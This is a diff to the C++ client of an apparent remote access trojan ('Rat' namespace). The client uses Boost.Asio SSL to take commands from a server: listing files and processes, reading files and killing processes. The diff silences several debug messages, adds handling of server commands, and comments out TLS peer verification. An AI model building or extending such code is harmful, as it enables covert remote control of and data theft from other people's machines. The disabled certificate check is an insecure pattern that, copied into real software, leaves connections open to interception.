@@ -27,7 +27,8 @@ namespace Rat
         networkManager_(),
         timer_(networkManager_.get_io_context())
     {
-        networkManager_.setup_ssl_context(false, "client.crt", "client.key", "ca.crt");
+        networkManager_.setup_ssl_context_client("ca.crt", host_);
+        // networkManager_.setup_ssl_context(false, "client.crt", "client.key", "ca.crt");
     }
 
     Client::~Client() 
@@ -67,7 +68,7 @@ namespace Rat
         } 
         catch (const std::exception& e) 
         {
-            std::cout << "Invalid ID: " << e.what() << "\n";
+            // std::cout << "Invalid ID: " << e.what() << "\n";
         }
         file.close();
     }
@@ -79,7 +80,7 @@ namespace Rat
         {
             socket_->lowest_layer().close();
             socket_.reset();
-            std::cout << "Debug: Closed previous socket\n";
+            // std::cout << "Debug: Closed previous socket\n";
         }
         socket_ = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
             networkManager_.get_io_context(), networkManager_.get_ssl_context());
@@ -89,7 +90,7 @@ namespace Rat
         boost::asio::async_connect(socket_->lowest_layer(), endpoints,
             [this](const boost::system::error_code& ec, boost::asio::ip::tcp::endpoint) {
                 if (!ec) {
-                    socket_->set_verify_mode(boost::asio::ssl::verify_peer);
+                    // socket_->set_verify_mode(boost::asio::ssl::verify_peer);
                     socket_->async_handshake(boost::asio::ssl::stream_base::client,
                         [this](const boost::system::error_code& ec) {
                             if (!ec) {
@@ -118,7 +119,7 @@ namespace Rat
             packet.set_packet_id("client_-1_" + std::to_string(std::rand()));
             packet.set_source_id("client_-1");
             packet.set_destination_id("server_0");
-            packet.set_encrypted(false);
+            packet.set_encrypted(true);
             auto* chunked = packet.mutable_chunked_data();
             chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
             chunked->set_sequence_number(0);
@@ -137,7 +138,7 @@ namespace Rat
             packet.set_packet_id("client_" + std::to_string(this_id_) + "_" + std::to_string(std::rand()));
             packet.set_source_id("client_" + std::to_string(this_id_));
             packet.set_destination_id("server_0");
-            packet.set_encrypted(false);
+            packet.set_encrypted(true);
             auto* chunked = packet.mutable_chunked_data();
             chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
             chunked->set_sequence_number(0);
@@ -158,7 +159,7 @@ namespace Rat
         {
             socket_->lowest_layer().close();
             socket_.reset();
-            std::cout << "Debug: Closed socket for reconnect\n";
+            // std::cout << "Debug: Closed socket for reconnect\n";
         }
         timer_.expires_from_now(boost::posix_time::seconds(5));
         timer_.async_wait([this](const boost::system::error_code& ec) 
@@ -184,12 +185,16 @@ namespace Rat
                     scheduleReconnect();
                     return;
                 }
+                if (packet.has_chunked_data())
+                {
+                    std::cout << "COMMAND FROM SERVER: " << packet.chunked_data().payload() << 111 << std::endl;
+                }
                 if (packet.has_chunked_data() && packet.type() == rat::Packet::STATIC_ID) 
                 {
                     try 
                     {
                         this_id_ = std::stol(packet.chunked_data().payload());
-                        std::ofstream file("client_id.txt", std::ios::app);
+                        std::ofstream file("client_id.txt");
                         if (file.is_open()) 
                         {
                             file << this_id_ << "\n";
@@ -198,10 +203,15 @@ namespace Rat
                     } 
                     catch (const std::exception& e) 
                     {
-                        std::cout << "Invalid ID: " << e.what() << "\n";
+                        // std::cout << "Invalid ID: " << e.what() << "\n";
                     }
                 }
-                std::cout << "Server: " << packet.chunked_data().payload() << "\n";
+                if (packet.has_chunked_data() && packet.type() == rat::Packet::COMMAND)
+                {
+                    std::cout << "COMMAND FROM SERVER: " << packet.chunked_data().payload();
+                    // process transfer file
+                }
+                // std::cout << "Server: " << packet.chunked_data().payload() << "\n";
                 boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
             });
     }
@@ -216,21 +226,21 @@ namespace Rat
             packet.set_source_id("client_" + std::to_string(this_id_));
             packet.set_destination_id("server_0");
             auto* chunked = packet.mutable_chunked_data();
-            chunked->set_payload(generateRandomData(10));
+            chunked->set_payload(input);
 
-            if (input == "LIST_FILES") 
+            if (input == "list_files") 
             {
                 packet.set_type(rat::Packet::LIST_FILES);
             } 
-            else if (input == "LIST_PROCESSES") 
+            else if (input == "list_processes") 
             {
                 packet.set_type(rat::Packet::LIST_PROCESSES);
             } 
-            else if (input == "READ_FILE") 
+            else if (input == "read_file") 
             {
                 packet.set_type(rat::Packet::READ_FILE);
             } 
-            else if (input == "KILL_PROCESS") 
+            else if (input == "kill_process") 
             {
                 packet.set_type(rat::Packet::KILL_PROCESS);
             } 
